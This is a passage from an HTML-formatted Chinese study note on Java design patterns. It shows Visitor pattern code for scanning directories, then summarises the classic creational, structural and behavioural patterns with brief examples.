&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isDir&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 递归调用:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">scan&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">collector&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>问题在于扫描目录的逻辑和处理文件的逻辑是一起的，如果下次需要增加一个清理&lt;code>.class&lt;/code>文件的功能，就必须再重复写扫描逻辑&lt;/p>
&lt;p>因此，访问者模式先把数据结构（这里是文件夹和文件构成的树型结构）和对其的操作（查找文件）分离开，以后如果要新增操作（例如清理&lt;code>.class&lt;/code>文件），只需要新增访问者，不需要改变现有逻辑。&lt;/p>
&lt;p>用访问者模式改写：&lt;/p>
&lt;p>首先需要定义访问者接口（能干的事）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Vistor&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 访问文件夹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">visitDir&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">dir&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 访问文件
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">visitFile&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>还要定义能持有文件夹和文件的数据结构FileStructure，我们给它传入一个访问者&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">FileStructure&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 根目录
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">FileStructure&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">handle&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Visitor&lt;/span> &lt;span style="color:#111">visitor&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">scan&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">visitor&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">scan&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Visitor&lt;/span> &lt;span style="color:#111">visitor&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isDirectory&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 让访问者处理文件夹:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">visitor&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">visitDir&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">sub&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">listFiles&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 递归处理子文件夹:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">scan&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">sub&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">visitor&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isFile&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 让访问者处理文件:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">visitor&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">visitFile&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这样，我们就把访问者的行为抽象出来了。如果我们要实现一种操作，例如，查找&lt;code>.java&lt;/code>文件，就传入&lt;code>JavaFileVisitor&lt;/code>：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">FileStructure&lt;/span> &lt;span style="color:#111">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileStructure&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">fs&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">handle&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">JavaFileVisitor&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个&lt;code>JavaFileVisitor&lt;/code>实现如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">JavaFileVisitor&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Visitor&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">visitDir&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">dir&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Visit dir: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">dir&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">visitFile&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">endsWith&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;.java&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Found java file: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>类似的，如果要清理&lt;code>.class&lt;/code>文件，可以再写一个&lt;code>ClassFileClearnerVisitor&lt;/code>：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ClassFileCleanerVisitor&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Visitor&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">visitDir&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">dir&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">visitFile&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">endsWith&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;.class&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Will clean class file: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可见，访问者模式的核心思想是为了访问比较复杂的数据结构，不去改变数据结构，而是把对数据的操作抽象出来，在“访问”的过程中以回调形式在访问者中处理操作逻辑。如果要新增一组操作，那么只需要增加一个新的访问者。&lt;/p>
&lt;h2 id="小结">小结&lt;/h2>
&lt;ul>
&lt;li>&lt;strong>工厂方法 Factory Method&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>不通过new来创建实例，而是抽象出接口xxxFactory（工厂，其中会定义一个静态方法用来在内部直接创建实例，留给外部调用getFactory），再写实现类xxxFactoryImpl（继承自接口，其中定义了具体的代码逻辑 返回抽象产品），客户端只需要和接口&amp;amp;抽象产品打交道即可&lt;/p>
&lt;ul>
&lt;li>&lt;strong>静态工厂方法 Static Factory Method&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>上面那个还是有点复杂，取消了接口，直接xxxFactory类通过静态方法返回抽象产品，这里的xxxFactory既是产品又是静态工厂&lt;/p>
&lt;ul>
&lt;li>&lt;strong>抽象工厂 Abstract Factory&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>有多个实际工厂 且分别对应多个实际产品，用抽象工厂模式会将这些实际工厂继续向上抽象，对客户端来说只需要知道抽象工厂和产品接口即可（中间的实际产品和实际工厂都会被屏蔽 不需要管）&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220902110636017.png" alt="image-20220902110636017">&lt;/p>
&lt;ul>
&lt;li>&lt;strong>生成器 Builder&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>将大的任务拆分，用多个小型工厂来创建一个完整对象&lt;/p>
&lt;p>*举例：md to html转换器，对不同类型文本的转换&lt;/p>
&lt;ul>
&lt;li>&lt;strong>原型 Protype&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>创建新对象的时候，根据现有的一个原型来创建&lt;/p>
&lt;p>*举例：已有一个&lt;code>String[]&lt;/code>数组，想创建一个一模一样的&lt;code>String[]&lt;/code>数组，我们会将现有数组的元素复制到新数组，这个过程封装起来就变成了原型模式&lt;/p>
&lt;ul>
&lt;li>&lt;strong>单例 Singleton&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>确保在一个进程中某个类有且仅有一个实例；在这种模式下构造方法为private防止调用方创建实例，类内部通过&lt;code>private static&lt;/code>来引用唯一创建的实例，或者通过&lt;code>public static&lt;/code>变量返回此唯一实例&lt;/p>
&lt;p>*举例：&lt;code>Runtime runtime = Runtime.getRuntime();&lt;/code>&lt;/p>
&lt;p>还可以通过enum枚举类来实现单例（因为java保证枚举类的每个枚举都是单例），同时避免了第一种方式实现Singleton的一个潜在问题，即序列化和反序列化会绕过普通类的&lt;code>private&lt;/code>构造方法从而创建出多个实例，而枚举类就没有这个问题&lt;/p>
&lt;ul>
&lt;li>&lt;strong>适配器 Adapter/Wrapper&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>近似理解为充电器转接口，将A接口转换为B接口；或者可以理解为接口的强制类型转换（近似）&lt;/p>
&lt;ul>
&lt;li>&lt;strong>桥接 Bridge&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>解决继承可能出现的子类爆炸情况，适用于多个需求同时排列组合&lt;/p>
&lt;p>*举例：汽车品牌×动力类型&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220902233406811.png" alt="image-20220902233406811">&lt;/p>
&lt;ul>
&lt;li>&lt;strong>组合 Composite&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>抽象出最基本的节点类型，使得叶子对象和容器对象具有一致性，从而形成统一的树形结构，在具体的实现类再细分实现的内容&lt;/p>
&lt;p>*举例：html渲染器&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220903000328506.png" alt="image-20220903000328506">&lt;/p>
&lt;ul>
&lt;li>&lt;strong>装饰器Decorator&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>在运行期动态给某个对象的实例增加功能的方法，与桥接模式的区别在于装饰器模式下把核心功能和附加功能分开了，而不是桥接中的二者并行，虽然二者都是为了避免继承中可能出现的子类爆炸，但装饰器是对已经有的功能做修饰（最终产品可以不被修饰，也可以不断被嵌套），桥接是把并行的多个功能进行排列组合&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220903101312952.png" alt="image-20220903101312952">&lt;/p>
&lt;p>*举例：html渲染器，但文本可以附加一些比如加粗、斜体之类的效果&lt;/p>
&lt;ul>
&lt;li>&lt;strong>门面/外观 Facade&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>类似房屋中介，内部有多个子系统提供服务，但对外只提供一个统一的Facade入口&lt;/p>
&lt;p>*举例；委托中介帮忙办理开公司的业务，其中包含工商注册、银行开户、纳税登记，但我们只需要给他信息就行，不需要知道核心是怎么跑的&lt;/p>
&lt;ul>
&lt;li>&lt;strong>享元 Flyweight&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>如果一个对象实例已经创建就不可变，那直接返回一个共享的实例即可；与单例的区别在于完全不可变（毕竟是缓存对象）&lt;/p>
&lt;ul>
&lt;li>&lt;strong>代理 Proxy&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>与适配器Adpater很相似，但不是将A接口转为B接口，它还是到A接口，只不过在包装的时候可以多加一些额外的代码&lt;/p>
&lt;p>*举例：有A接口 其中实现了a方法，而AProxy类继承自A，其中的a方法可以增加鉴权，如果想要其它类型的代理只需要继续继承A即可&lt;/p>
&lt;ul>
&lt;li>&lt;strong>远程代理 Remote Proxy&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>*举例：Java RMI&lt;/p>
&lt;ul>
&lt;li>&lt;strong>虚代理 Virtual Proxy&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>让调用者先持有一个代理对象，但真正的对象尚未创建，直到用的时候才创建&lt;/p>
&lt;p>*举例：JDBC的连接池返回的JDBC连接（Connection对象）就是一个虚代理，即获取连接时根本没连上，直到第一次查询或更新操作时才会创建真正的JDBC连接&lt;/p>
&lt;ul>
&lt;li>&lt;strong>保护代理 Protection Proxy&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>用代理对象控制对原始对象的访问，常用于鉴权&lt;/p>
&lt;ul>
&lt;li>&lt;strong>智能引用 Smart Reference&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>也是一种代理对象，如果有很多客户端对它进行访问，通过内部的计数器可以在外部调用者都不使用后自动释放&lt;/p>
&lt;ul>
&lt;li>&lt;strong>责任链 Chain of Responsibility&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>*举例：web中的filter, interceptor&lt;/p>
&lt;ul>
&lt;li>&lt;strong>命令 Command&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>把请求封装成一个命令，然后执行该命令&lt;/p>
&lt;p>*举例：文本编辑器&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220903142302481.png" alt="image-20220903142302481">&lt;/p>
&lt;p>把调用方发送命令和执行方执行命令分开了，客户端需要操心的是命令内容，而不是具体的操作（函数）；当TextEditor本身复杂到一定程度、需要持Undo、Redo的功能时，就需要使用命令模式，因为我们可以给每个命令增加&lt;code>undo()&lt;/code>：然后把执行的一系列命令用&lt;code>List&lt;/code>保存起来，就既能支持Undo，又能支持Redo。这个时候，我们又需要一个&lt;code>Invoker&lt;/code>对象，负责执行命令并保存历史命令：&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220903142424888.png" alt="image-20220903142424888">&lt;/p>
&lt;ul>
&lt;li>&lt;strong>解释器Interpreter&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>是一种针对特定问题设计的一种解决方案&lt;/p>
&lt;p>*举例：正则表达式；JDBC连接语句&lt;/p>
&lt;ul>
&lt;li>&lt;strong>迭代器Iterator&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>提供一种方法顺序访问一个聚合对象中的各个元素，而又不需要暴露该对象的内部表示。&lt;/p>
&lt;ul>
&lt;li>&lt;strong>中介/调停者 Mediator&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>提供一种方法顺序访问一个聚合对象中的各个元素，而又不需要暴露该对象的内部表示；经常用在有众多交互组件的UI上&lt;/p>
&lt;p>*举例：点餐输入框，点击会影响选择状态（选择全部/取消所有/反选）&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220903144849479.png" alt="image-20220903144849479">&lt;/p>
&lt;p>设计中介（引入UI组件，并用类似回调的函数与之交互）&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220903144925149.png" alt="image-20220903144925149">&lt;/p>
&lt;ul>
&lt;li>&lt;strong>备忘录 Memento&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>主要用于捕获一个对象的内部状态，以便在将来的某个时候恢复此状态&lt;/p>
&lt;p>*举例：反序列化&lt;/p>
&lt;ul>
&lt;li>&lt;strong>观察者 Observer/发布-订阅 Publish-Subscribe&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>一种通知机制，让发送通知的一方（被观察方）和接收通知的一方（观察者）能彼此分离，互不影响，当一个对象的状态发生改变时，所有依赖于它的对象都得到通知并被自动更新&lt;/p>
&lt;p>*举例：电商平台，消费者和管理员同时对商品的上架、价格改变都感兴趣，需要收到通知&lt;/p>
&lt;ul>
&lt;li>&lt;strong>状态 State&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>允许一个对象在其内部状态改变时改变它的行为。对象看起来似乎修改了它的类。&lt;/p>
&lt;p>*举例：聊天机器人（已连线/未连线状态的切换）&lt;/p>
&lt;ul>
&lt;li>&lt;strong>策略 Strategy&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>就像把函数作为函数的参数，整体流程是确定的，但具体的细节还可以自定义&lt;/p>
&lt;p>*举例：商场中不同规格的会员折扣&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220903162006786.png" alt="image-20220903162006786">&lt;/p>
&lt;ul>
&lt;li>&lt;strong>模板 Template&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>充分利用接口，继承和抽象；父类定义骨架，子类实现某些细节&lt;/p>
&lt;ul>
&lt;li>&lt;strong>访问者 Visitor&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>是一种操作一组对象的操作，它的目的是不改变对象的定义，但允许新增不同的访问者，来定义新的操作；核心思想是为了访问比较复杂的数据结构，不去改变数据结构，而是把对数据的操作抽象出来，在“访问”的过程中以回调形式在访问者中处理操作逻辑。如果要新增一组操作，那么只需要增加一个新的访问者。&lt;/p>
&lt;p>*举例：我们要递归遍历某个文件夹的所有子文件夹和文件，然后找出&lt;code>.java&lt;/code>文件，正常的做法是写个递归，但问题在于扫描目录的逻辑和处理文件的逻辑是一起的，如果下次需要增加一个清理&lt;code>.class&lt;/code>文件的功能，就必须再重复写扫描逻辑；因此访问者模式先把数据结构（这里是文件夹和文件构成的树型结构）和对其的操作（查找文件）分离开，以后如果要新增操作（例如清理&lt;code>.class&lt;/code>文件），只需要新增访问者，不需要改变现有逻辑。&lt;/p>
&lt;hr>
&lt;details>
